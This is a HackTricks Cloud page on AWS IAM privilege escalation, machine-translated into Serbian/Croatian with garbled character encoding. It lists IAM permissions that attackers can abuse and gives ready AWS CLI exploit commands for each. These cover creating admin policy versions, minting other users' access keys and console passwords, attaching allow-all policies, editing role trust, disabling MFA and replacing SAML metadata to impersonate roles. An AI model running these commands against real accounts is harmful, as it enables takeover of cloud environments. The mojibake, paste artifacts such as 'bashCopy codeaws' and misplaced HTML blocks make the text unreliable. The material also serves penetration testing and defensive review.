# AWS - IAM Privilegije

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## IAM

Za viÅ¡e informacija o IAM-u pogledajte:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

Dodeljuje moguÄ‡nost kreiranja nove verzije IAM politike, zaobilazeÄ‡i potrebu za `iam:SetDefaultPolicyVersion` dozvolom koriÅ¡Ä‡enjem `--set-as-default` zastavice. Ovo omoguÄ‡ava definisanje prilagoÄ‘enih dozvola.

**Exploit Komanda:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Utjecaj:** Izravno poveÄ‡ava privilegije omoguÄ‡avajuÄ‡i bilo koju radnju na bilo kojem resursu.

### **`iam:SetDefaultPolicyVersion`**

OmoguÄ‡ava promjenu zadane verzije IAM politike na drugu postojeÄ‡u verziju, potencijalno poveÄ‡avajuÄ‡i privilegije ako nova verzija ima viÅ¡e dozvola.

**Bash naredba:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Uticaj:** Indirektno eskaliranje privilegija omoguÄ‡avanjem dodatnih dozvola.

### **`iam:CreateAccessKey`**

OmoguÄ‡ava kreiranje ID-a pristupnog kljuÄa i tajnog pristupnog kljuÄa za drugog korisnika, Å¡to moÅ¾e dovesti do potencijalnog eskaliranja privilegija.

**Eksploatacija:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Uticaj:** Direktno poveÄ‡anje privilegija preuzimanjem proÅ¡irenih dozvola drugog korisnika.

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

OmoguÄ‡ava kreiranje ili aÅ¾uriranje profila za prijavljivanje, ukljuÄujuÄ‡i postavljanje lozinki za AWS konzolno prijavljivanje, Å¡to dovodi do direktnog poveÄ‡anja privilegija.

**Eksploatacija za kreiranje:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Eksploatacija za aÅ¾uriranje:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Uticaj:** Direktno eskaliranje privilegija putem prijavljivanja kao "bilo koji" korisnik.

### **`iam:UpdateAccessKey`**

OmoguÄ‡ava omoguÄ‡avanje onemoguÄ‡enog pristupnog kljuÄa, Å¡to potencijalno moÅ¾e dovesti do neovlaÅ¡Ä‡enog pristupa ako napadaÄ poseduje onemoguÄ‡eni kljuÄ.

**Eksploatacija:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**Utjecaj:** Direktno poveÄ‡anje privilegija ponovnim aktiviranjem pristupnih kljuÄeva.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

OmoguÄ‡ava generiranje ili resetiranje vjerodajnica za odreÄ‘ene AWS usluge (npr. CodeCommit, Amazon Keyspaces), nasljeÄ‘ujuÄ‡i ovlasti povezanih korisnika.

**IskoriÅ¡tavanje za stvaranje:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**Eksploatacija za Resetovanje:**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**Utjecaj:** Izravno poveÄ‡anje privilegija unutar korisnikovih dozvola usluge.

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

OmoguÄ‡uje povezivanje politika s korisnicima ili grupama, izravno poveÄ‡avajuÄ‡i privilegije nasljeÄ‘ivanjem dozvola povezane politike.

**IskoriÅ¡tavanje za korisnika:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Eksploatacija za grupu:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Utjecaj:** Izravno poveÄ‡anje privilegija za sve Å¡to politika omoguÄ‡uje.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

OmoguÄ‡uje povezivanje ili postavljanje politika za uloge, korisnike ili grupe, omoguÄ‡avajuÄ‡i izravno poveÄ‡anje privilegija dodjeljivanjem dodatnih dozvola.

**IskoriÅ¡tavanje za ulogu:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Eksploatacija za Inline politike:**

```html
<details>
<summary>Opis</summary>

Inline politike su politike koje su vezane direktno za IAM korisnika, grupe ili uloge. One se definiÅ¡u unutar samog objekta i ne mogu biti deljene sa drugim objektima. Ovo Äini inline politike pogodnim ciljem za eskalaciju privilegija.

</details>

<details>
<summary>Metoda</summary>

1. Identifikujte IAM korisnika, grupu ili ulogu koja ima inline politiku koju Å¾elite da iskoristite.

2. Kreirajte novu inline politiku koja Ä‡e vam omoguÄ‡iti potrebne privilegije. MoÅ¾ete kopirati postojeÄ‡u inline politiku i izmeniti je prema vaÅ¡im potrebama.

3. AÅ¾urirajte inline politiku ciljnog objekta sa novom politikom koju ste kreirali.

4. Proverite da li su vam dodeljene nove privilegije tako Å¡to Ä‡ete izvrÅ¡iti odgovarajuÄ‡e akcije koje su bile ograniÄene pre eskalacije privilegija.

</details>
```
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
MoÅ¾ete koristiti politiku poput:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**Uticaj:** Direktno eskaliranje privilegija dodavanjem dozvola putem politika.

### **`iam:AddUserToGroup`**

OmoguÄ‡ava dodavanje sebe u IAM grupu, eskaliranje privilegija nasleÄ‘ivanjem dozvola grupe.

**Eksploatacija:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**Utjecaj:** Izravno poveÄ‡anje privilegija na razinu dozvola grupe.

### **`iam:UpdateAssumeRolePolicy`**

OmoguÄ‡uje izmjenu dokumenta politike pretpostavljanja uloge, omoguÄ‡ujuÄ‡i pretpostavljanje uloge i povezane dozvole.

**IskoriÅ¡tavanje:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Gde politika izgleda kao Å¡to je prikazano ispod, koja korisniku daje dozvolu da pretpostavi ulogu:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Utjecaj:** Izravno poveÄ‡anje privilegija preuzimanjem dozvola bilo koje uloge.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

OmoguÄ‡ava preuzimanje SSH javnog kljuÄa za autentifikaciju na CodeCommit i deaktiviranje ureÄ‘aja za viÅ¡estruku autentifikaciju (MFA), Å¡to moÅ¾e dovesti do potencijalnog neizravnog poveÄ‡anja privilegija.

**IskoriÅ¡tavanje za preuzimanje SSH kljuÄa:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Eksploatacija za deaktivaciju MFA:**

```html
1. Identify an IAM user with the necessary permissions to modify MFA settings.
2. Obtain the access key and secret key for the identified IAM user.
3. Use the obtained credentials to authenticate with the AWS CLI or SDK.
4. Execute the following command to disable MFA for the targeted IAM user:

   ```
   aws iam deactivate-mfa-device --user-name <IAM_USER_NAME> --serial-number <MFA_SERIAL_NUMBER>
   ```

   Replace `<IAM_USER_NAME>` with the username of the targeted IAM user and `<MFA_SERIAL_NUMBER>` with the serial number of the MFA device associated with the user.
5. Verify that MFA has been successfully disabled for the targeted IAM user.
```
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Utjecaj:** Indirektno poveÄ‡anje privilegija omoguÄ‡avanjem pristupa CodeCommit-u ili onemoguÄ‡avanjem MFA zaÅ¡tite.

### **`iam:ResyncMFADevice`**

OmoguÄ‡ava resinkronizaciju MFA ureÄ‘aja, Å¡to potencijalno moÅ¾e dovesti do indirektnog poveÄ‡anja privilegija manipulacijom MFA zaÅ¡tite.

**Bash naredba:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Uticaj:** Indirektno eskaliranje privilegija dodavanjem ili manipulacijom MFA ureÄ‘aja.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Sa ovim dozvolama moÅ¾ete **promeniti XML metapodatke SAML konekcije**. Zatim, moÅ¾ete zloupotrebiti **SAML federaciju** da se **prijavite** sa bilo kojom **ulogom koja mu veruje**.

Imajte na umu da **legitimni korisnici neÄ‡e moÄ‡i da se prijave**. MeÄ‘utim, moÅ¾ete dobiti XML, tako da moÅ¾ete postaviti svoj, prijaviti se i konfigurisati prethodno stanje.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: Alat koji moÅ¾e generisati SAML metapodatke i prijaviti se sa odreÄ‘enom ulogom
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Nesiguran u vezi ovoga) Ako napadaÄ ima ove **dozvole**, moÅ¾e dodati novi **Thumbprint** kako bi uspeo da se prijavi u sve uloge koje veruju provajderu.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju oglaÅ¡enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
